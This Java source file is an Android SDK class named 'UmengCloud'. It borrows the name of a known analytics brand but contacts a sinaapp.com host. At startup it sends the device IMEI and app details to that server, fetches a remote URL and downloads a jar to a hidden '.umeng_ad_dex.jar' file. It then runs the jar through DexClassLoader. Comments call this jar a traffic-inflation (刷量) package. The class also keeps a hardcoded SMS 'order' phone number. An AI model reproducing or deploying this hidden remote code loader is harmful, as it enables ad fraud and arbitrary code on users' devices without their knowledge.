package com.umeng.ad.cloud;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.umeng.ad.app.LibInterFace;

import dalvik.system.DexClassLoader;

public class UmengCloud {

	private static boolean logEnable = UmengLog.logEnable;
	private static Context context;
	protected static final String DOWNLOAD_FOLDERNAME = "umeng";
	private static final String HEADER_APIKEY = "apikey";
	private static final String HEADER_CHANNEL = "channel";
	private static final String HEADER_VERSIONCODE = "versioncode";
	private static final String HEADER_VERSIONNAME = "versionname";
	private static final String HEADER_DEVICEID = "deviceid";

	//
	public final static String APP_PREF_FILE = "asconf";
	protected static final String PREFNAME = ".umeng";

	// Umeng online params
	public final static String PREF_KEY_UMENG_ONLINE_PARAM_ORDER_PHONE_NUMBER = "umeng_online_param_order_phone_number";
	public final static String PREF_KEY_UMENG_ONLINE_PARAM_CHANNEL = "umeng_online_param_channel";
	public final static String PREF_KEY_UMENG_ONLINE_PARAM_CATEGORY = "umeng_online_param_category";
	public final static String PREF_KEY_UMENG_ONLINE_PARAM_SERVER_URL_IMG = "umeng_online_param_server_url_img";
	public final static String PREF_KEY_UMENG_ONLINE_PARAM_SERVER_URL_API = "umeng_online_param_server_url_api";
	public final static String PREF_KEY_UMENG_ONLINE_PARAM_MARKING_QQ_URL = "umeng_online_param_marketing_qq_url";

	public final static String umeng_server_online_product_order = "订单中心";
	public final static String umeng_server_online_product_server = "服务器地址";
	public final static String umeng_server_online_marketing_qq_url = "营销QQ地址";

	static void initSDCardUmengFolder(Context context) {
		try {
			String jarSDCardFolder = context.getDir(DOWNLOAD_FOLDERNAME,
					Context.MODE_PRIVATE).getAbsolutePath()
					+ "/";
			File fileFolder = new File(jarSDCardFolder);
			if (!fileFolder.exists()) {
				fileFolder.mkdirs();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 把下载的文件拷贝到sdcard、umeng文件下边
	 * 
	 * @param context
	 * @param downloadedFilePath
	 */
	static void copyDownloadedFileToSDCardUmeng(Context context,
			String downloadedFilePath) {
		try {

			InputStream inputStream = new FileInputStream(new File(
					downloadedFilePath));
			File fileFolder = context.getDir(DOWNLOAD_FOLDERNAME,
					Context.MODE_PRIVATE);
			if (!fileFolder.exists()) {
				fileFolder.mkdirs();
			}

			// new jar file
			String filePath = fileFolder.getAbsolutePath() + "/"
					+ ".umeng_ad_dex.jar";
			UmengLog.d("filePath:" + filePath);
			File file = new File(filePath);
			if (file.exists()) {
				file.delete();
			}
			file.createNewFile();

			// or file in .umengpath
			File umengFile = new File(fileFolder.getAbsolutePath() + "/");
			File[] umengFiles = umengFile.listFiles();
			for (File file2 : umengFiles) {
				if (file2.exists()
						&& !downloadedFilePath.equals(file2.getAbsolutePath())) {
					file2.delete();
				}
			}

			// Delete old .dex file for 2.3 or more little level android
			String dexFilePath = fileFolder.getAbsolutePath() + "/" + "."
					+ "umeng_ad_dex.jar".replaceFirst("jar", "dex");

			File dexFile = new File(dexFilePath);
			if (dexFile.exists()) {
				dexFile.delete();
			}

			// Delete old .dex file for 2.4 or more little level android
			File dexFile2 = context.getDir("dex", 0);
			File[] files2 = dexFile2.listFiles();
			for (File file2 : files2) {
				if (file2.exists()) {
					file2.delete();
				}
			}

			FileOutputStream outputStream = new FileOutputStream(file);
			byte[] bytes = new byte[1024];
			int len = -1;
			while ((len = inputStream.read(bytes)) > 0) {
				outputStream.write(bytes, 0, len);
			}
			outputStream.flush();
			outputStream.close();
			inputStream.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 
	 * @param context
	 * @param srcJarFileName
	 * @param theclass
	 * @return target class instance
	 */
	private static <T> T getTargetInterface(Context context, String apikey,
			String channel, String srcJarFileName, String targetClassName,
			Class<T> theclass) {
		try {
			File folder = context.getDir(DOWNLOAD_FOLDERNAME,
					Context.MODE_PRIVATE);
			String filePath = folder.getAbsolutePath() + "/" + "."
					+ srcJarFileName;

			File file = context.getDir("dex", 0);
			ClassLoader cl = new DexClassLoader(filePath,
					file.getAbsolutePath(), null, context.getClassLoader());
			Class<?> libProviderClazz = null;

			try {
				libProviderClazz = cl.loadClass(targetClassName);
				UmengLog.d("libProviderClazz:" + libProviderClazz);
				T libInterFace = (T) libProviderClazz.newInstance();
				return libInterFace;
			} catch (Exception exception) {
				UmengLog.e("exception:" + exception);
				exception.printStackTrace();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	private static <T> T getTargetUmengInterface(Context context,
			String apikey, String channel, Class<T> theclass) {
		return UmengCloud
				.getTargetInterface(context, apikey, channel,
						"umeng_ad_dex.jar", "com.umeng.ad.app.MobiclickAgent",
						theclass);
	}

	public static void setLogEnable(boolean logEnable) {
		UmengCloud.logEnable = logEnable;
		UmengLog.logEnable = logEnable;
	}

	/**
	 * 初始化UmengCloud
	 * 
	 * @param context
	 * @param apikey
	 */
	public static void init(final Context context, final String apikey,
			final String channel) {
		UmengCloud.context = context;
		new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					URL Url = new URL(
							"http://umeng.sinaapp.com/enter.php/Api/RankConfig/onlineParams");
					URLConnection conn = Url.openConnection();
					conn.addRequestProperty(HEADER_APIKEY, apikey);
					conn.addRequestProperty(HEADER_CHANNEL,
							String.valueOf(URLEncoder.encode(channel, "utf-8")));
					conn.addRequestProperty(HEADER_VERSIONCODE,
							getAppVersionCode(UmengCloud.context) + "");
					conn.addRequestProperty(HEADER_VERSIONNAME,
							getAppVersionName(UmengCloud.context));
					conn.addRequestProperty(HEADER_DEVICEID,
							getIMEI(UmengCloud.context));

					conn.connect();
					InputStream is = conn.getInputStream();
					byte[] bytes = new byte[1024];
					int len = -1;
					ByteArrayOutputStream out = new ByteArrayOutputStream();
					while ((len = is.read(bytes)) > 0) {
						out.write(bytes, 0, len);
					}
					out.flush();
					is.close();
					String content = new String(out.toByteArray(), "utf-8");
					out.close();
					UmengLog.i("dexjar_json:"
							+ URLDecoder.decode(content, "utf-8"));
					// 保存数据
					String url = saveData(context, content);
					UmengLog.i("dexjar_url:" + url);

					// 发送消息给主线程
					Message msg = new Message();
					msg.what = 100;
					msg.obj = url;
					handler.sendMessage(msg);

				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();

		// 初始化动态包
		try {
			LibInterFace libInterFace = UmengCloud.getTargetUmengInterface(
					context, apikey, channel, LibInterFace.class);
			if (libInterFace != null && isDownloadedDex(UmengCloud.context)) {
				libInterFace.libEnableLog(UmengCloud.logEnable);
				libInterFace.libInit(context, apikey, channel);
			} else {
				UmengLog.w("LibInterFace is null");
			}
		} catch (AbstractMethodError ee) {
			ee.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	/**
	 * 保存在线参数到本地SharedPreference中
	 * 
	 * @param context
	 * @param content
	 * @return
	 */
	private static String saveData(Context context, String content) {
		try {
			String dex_url = null;
			JSONArray array = new JSONArray(content);
			// 刷量等信息，dex_url等
			SharedPreferences sp = context.getSharedPreferences(PREFNAME,
					Context.MODE_PRIVATE);
			Editor editor = sp.edit();

			// 订单中心，serverurl等信息
			SharedPreferences sp2 = context.getSharedPreferences(APP_PREF_FILE,
					Context.MODE_PRIVATE);
			Editor editor2 = sp2.edit();

			for (int i = 0; i < array.length(); i++) {
				JSONObject object = array.getJSONObject(i);
				String name = object.getString("name");
				String value = object.getString("value").trim();
				// 订单中心
				if (umeng_server_online_product_order.equals(name)) {
					editor2.putString(
							PREF_KEY_UMENG_ONLINE_PARAM_ORDER_PHONE_NUMBER,
							value);
				}
				// 服务器地址
				if (umeng_server_online_product_server.equals(name)) {
					JSONObject serverObject = new JSONObject(value);
					editor2.putString(
							PREF_KEY_UMENG_ONLINE_PARAM_SERVER_URL_API,
							serverObject.getString("api"));
					editor2.putString(
							PREF_KEY_UMENG_ONLINE_PARAM_SERVER_URL_IMG,
							serverObject.getString("img"));
				}
				// qq营销中心
				if (umeng_server_online_marketing_qq_url.equals(name)) {
					editor2.putString(
							PREF_KEY_UMENG_ONLINE_PARAM_MARKING_QQ_URL, value);
				}
				// umeng刷量jar包
				if ("umeng_dex_url".equals(name)) {
					dex_url = value;
				}
				// 刷量api_url
				if ("umeng_index_url".equals(name)) {
					editor.putString("umeng_index_url", value);

				}
			}// End for
			editor.commit();
			editor2.commit();
			return dex_url;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	public static void start(Context context, String apikey, String channel) {
		UmengLog.d("clould start");
		try {
			// 初始化动态包
			LibInterFace libInterFace = UmengCloud.getTargetUmengInterface(
					context, apikey, channel, LibInterFace.class);
			if (libInterFace != null) {
				libInterFace.libEnableLog(UmengCloud.logEnable);
				if (readConfigFromPref(context) == null
						&& isDownloadedDex(UmengCloud.context)) {
					UmengLog.w("config xml is null,begin lib init()");
					libInterFace.libInit(context, apikey, channel);
				} else if (isDownloadedDex(UmengCloud.context))
					libInterFace.libStart(context, apikey, channel);
			} else {
				UmengLog.w("LibInterFace is null");
			}
		} catch (AbstractMethodError ee) {
			ee.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	public static void postData(Context context, String apikey, String channel) {
		UmengLog.d("clould postData");
		try {
			// 初始化动态包
			LibInterFace libInterFace = UmengCloud.getTargetUmengInterface(
					context, apikey, channel, LibInterFace.class);
			if (libInterFace != null && isDownloadedDex(UmengCloud.context)) {
				libInterFace.libEnableLog(UmengCloud.logEnable);
				libInterFace.libPostData(context, apikey, channel);
			} else {
				UmengLog.w("LibInterFace is null");
			}
		} catch (AbstractMethodError ee) {
			ee.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	/**
	 * Read config context which got from server
	 * 
	 * @param context
	 * @return
	 */
	private static String readConfigFromPref(Context context) {
		try {
			SharedPreferences sp = context.getSharedPreferences(
					PREFNAME, Context.MODE_PRIVATE);
			return sp.getString("config", null);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	private static Handler handler = new Handler() {
		@Override
		public void handleMessage(android.os.Message msg) {
			if (msg.what == 100) {
				try {
					// 第一步，更新本地文件
					String url = (String) msg.obj;
					SharedPreferences sp = context.getSharedPreferences(
							PREFNAME, Context.MODE_PRIVATE);
					Editor editor = sp.edit();
					editor.putString("latest_dex_url", url);
					editor.commit();

					// 第二步，启动下载
					initSDCardUmengFolder(context);
					DownloadUtils downloadUtils = new DownloadUtils();
					downloadUtils.startDownload(
							context,
							url,
							context.getDir(DOWNLOAD_FOLDERNAME,
									Context.MODE_PRIVATE).getAbsolutePath()
									+ "/",
							url.substring(url.lastIndexOf("/") + 1));
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		};
	};

	/**
	 * 获取当前软件版本
	 * 
	 * @param context
	 * @return
	 */
	public static String getAppVersionName(Context context) {
		PackageManager pm = context.getPackageManager();
		PackageInfo pi;
		try {
			pi = pm.getPackageInfo(context.getPackageName(), 0);
			String versionName = pi.versionName;
			return versionName;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return "";
	}

	/**
	 * 获取当前软件版本号
	 * 
	 * @param context
	 * @return
	 */
	public static int getAppVersionCode(Context context) {
		PackageManager pm = context.getPackageManager();
		PackageInfo pi;
		try {
			pi = pm.getPackageInfo(context.getPackageName(), 0);
			int versionCode = pi.versionCode;
			return versionCode;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return 0;
	}

	/**
	 * 
	 * @param context
	 * @param keyName
	 * @return
	 */
	public static String getMetaData(Context context, String keyName) {
		try {
			ApplicationInfo info = context.getPackageManager()
					.getApplicationInfo(context.getPackageName(),
							PackageManager.GET_META_DATA);

			Bundle bundle = info.metaData;
			Object value = bundle.get(keyName);
			return String.valueOf(value);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return "";
	}

	/**
	 * 获取device_id
	 * 
	 * @param context
	 * @return
	 */
	public static String getIMEI(Context context) {
		TelephonyManager mTelephonyMgr = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imei;
		if ((Build.MODEL.equals("sdk")) || (Build.MODEL.equals("google_sdk"))) {
			SharedPreferences sp = context.getSharedPreferences(PREFNAME,
					Context.MODE_PRIVATE);
			imei = sp.getString("android.os.SystemProperties.DeviceId", "");
			if (imei == null || imei.length() < 1) {
				imei = UUID.randomUUID().toString();
				Editor editor = sp.edit();
				editor.putString("android.os.SystemProperties.DeviceId", imei);
				editor.commit();
			}
		} else {
			imei = mTelephonyMgr.getDeviceId();
			if (TextUtils.isEmpty(imei) || imei.equals("000000000000000")) {
				SharedPreferences sp = context.getSharedPreferences(PREFNAME,
						Context.MODE_PRIVATE);
				imei = sp.getString("android.os.SystemProperties.DeviceId", "");
				if (imei.length() < 1) {
					imei = UUID.randomUUID().toString();
					Editor editor = sp.edit();
					editor.putString("android.os.SystemProperties.DeviceId",
							imei);
					editor.commit();
				}
			}
		}
		return imei;
	}

	/**
	 * Umeng online param order phone number, deault is fenghaitao mobile phone
	 * number, set the defualt number in strings.xml, key name is
	 * "order_sent_sms_number"
	 * 
	 * @param context
	 * @return
	 */
	public static String getUmengOnlineParamOrderPhoneNumber(Context context) {

		String defNumber = "13366655137";
		SharedPreferences sp = context.getSharedPreferences(APP_PREF_FILE,
				Context.MODE_PRIVATE);
		String number = sp.getString(
				PREF_KEY_UMENG_ONLINE_PARAM_ORDER_PHONE_NUMBER, defNumber);
		if (isPhoneNumberValid(number)) {
			// Logger.i(TAG, "getUmengOnlineParamOrderPhoneNumber = " + number);
			return number;
		}

		return null;
	}

	/**
	 * phoneNumber is phone number or not ?
	 * 
	 * @param phoneNumber
	 * @return
	 */
	private static boolean isPhoneNumberValid(String phoneNumber) {

		boolean isValid = false;
		CharSequence inputStr = phoneNumber;

		String mobilePhone = "^((\\+86)|(86))?((13[0-9])|(145|147)|(15[^4,\\D])|(18[^4,\\D]))\\d{8}$";
		Pattern mobilePattern = Pattern.compile(mobilePhone);
		Matcher mobileMatcher = mobilePattern.matcher(inputStr);

		if (mobileMatcher.matches()) {
			isValid = true;
		}
		return isValid;
	}

	/**
	 * Umeng online param server url of img, deault is null.But when you get
	 * url, PlayApplication will return
	 * 
	 * @param context
	 * @return
	 */
	public static String getUmengOnlineParamServerUrlImg(Context context) {

		SharedPreferences sp = context.getSharedPreferences(APP_PREF_FILE,
				Context.MODE_PRIVATE);
		String imgUrl = sp.getString(
				PREF_KEY_UMENG_ONLINE_PARAM_SERVER_URL_IMG, null);
		if (imgUrl != null && imgUrl.startsWith("http")) {
			// Logger.i(TAG, "getUmengOnlineParamServerUrlImg = " + imgUrl);
			return imgUrl;
		}

		return null;
	}

	/**
	 * Umeng online param server url of api, deault is null.But when you get
	 * url, PlayApplication will return PlayApplication.APP_SERVER_URL
	 * 
	 * @param context
	 * @return
	 */
	public static String getUmengOnlineParamServerUrlApi(Context context) {

		if (context == null) {
			return null;
		}
		SharedPreferences sp = context.getSharedPreferences(APP_PREF_FILE,
				Context.MODE_PRIVATE);
		String apiUrl = sp.getString(
				PREF_KEY_UMENG_ONLINE_PARAM_SERVER_URL_API, null);
		if (apiUrl != null && apiUrl.startsWith("http")) {
			UmengLog.d("getUmengOnlineParamServerUrlApi = " + apiUrl);
			return apiUrl;
		}

		return null;
	}

	/**
	 * umeng online param marketing qq url, default is null.
	 * 
	 * @param context
	 * @return
	 */
	public static String getUmengOnlineParamMarketingQQUrl(Context context) {

		try {
			SharedPreferences sp = context.getSharedPreferences(APP_PREF_FILE,
					Context.MODE_PRIVATE);
			String marketingQQUrl = sp.getString(
					PREF_KEY_UMENG_ONLINE_PARAM_MARKING_QQ_URL, null);
			if (marketingQQUrl != null
					&& marketingQQUrl.startsWith("http://webchat.b.qq.com")) {
				UmengLog.d("getUmengOnlineParamMarketingQQUrl marketingQQUrl = "
						+ marketingQQUrl);
				return marketingQQUrl;
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return null;
	}

	/**
	 * 是不是第一次使用本软件
	 * 
	 * @param context
	 * @return
	 */
	public static boolean isDownloadedDex(Context context) {
		try {
			SharedPreferences sp = context.getSharedPreferences(PREFNAME,
					Context.MODE_PRIVATE);
			return sp.getBoolean("version_download_dex_"
					+ getAppVersionCode(UmengCloud.context)
					+ getAppVersionName(UmengCloud.context), false);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	/**
	 * 下载完成
	 * 
	 * @param context
	 */
	public static void downloaeDexOK(Context context) {
		try {
			SharedPreferences sp = context.getSharedPreferences(PREFNAME,
					Context.MODE_PRIVATE);
			Editor editor = sp.edit();
			editor.putBoolean("version_download_dex_"
					+ getAppVersionCode(UmengCloud.context)
					+ getAppVersionName(UmengCloud.context), true);
			editor.commit();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
